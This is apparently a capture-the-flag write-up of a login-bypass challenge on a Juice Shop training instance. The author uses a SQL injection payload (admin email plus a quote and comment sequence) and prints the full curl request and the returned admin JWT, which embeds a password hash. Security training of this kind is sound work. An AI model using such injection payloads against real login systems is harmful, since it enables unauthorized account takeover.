this challenge requires me to login as site admin without obtaining the admin's password. 

i first go to the the main website https://juice.8-thousander.me/#/ and browsed the apple juice item. 

in review section of the item, i noice a review made by a user admin@juice-sh.op

based on the username and domain name of the email address, it is quite possible the review was made by the site admin. 

so i leveraged the opportunity to perform a sql injection attack. 

i browsed to the login ui https://juice.8-thousander.me/#/login

then i used admin@juice-sh.op'-- as username, and some artibtrary string as password. 

the special sequence '-- will end the query the interpretation in the sql engine, bypassing rest of the filtering conditions, resulting in a query that is always success. 

this is the api request extracted from browser developer tool

curl 'https://juice.8-thousander.me/rest/user/login' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,zh-CN;q=0.6' \
  -H 'content-type: application/json' \
  -H 'cookie: language=en; cookieconsent_status=dismiss; continueCode=lLrP7weLvQboX2p1gO354xyjdRjT9iK8f2edNl8K9mnRzD6qMaWVBJkEZYoO; welcomebanner_status=dismiss' \
  -H 'dnt: 1' \
  -H 'origin: https://juice.8-thousander.me' \
  -H 'referer: https://juice.8-thousander.me/' \
  -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
  --data-raw $'{"email":"admin@juice-sh.op\'--","password":"admin@juice-sh.op\'--"}' \
  --compressed

this is the response from the query

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTkuMC4zIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjQxOjU0LjA3MiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjU1OjExLjI1MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Nzk0OTc2MTcsImV4cCI6MTY3OTUxNTYxN30.oOvQJWIgEQRAP9B5gP0tE6SrU7ws6RuczksKQkLV-UheTm2SYEogOdu65gPVVJsmw-wNyhvOUUGif02x52Box-XwgCtOMkgt7cDQaG2hfQWOmQvUKh0pI9BNmY5bR7Q_JL13izn4QNmFMyOClMxELiLZNSf98aJWjw_Gc-0Qrxs","bid":1,"umail":"admin@juice-sh.op"}}


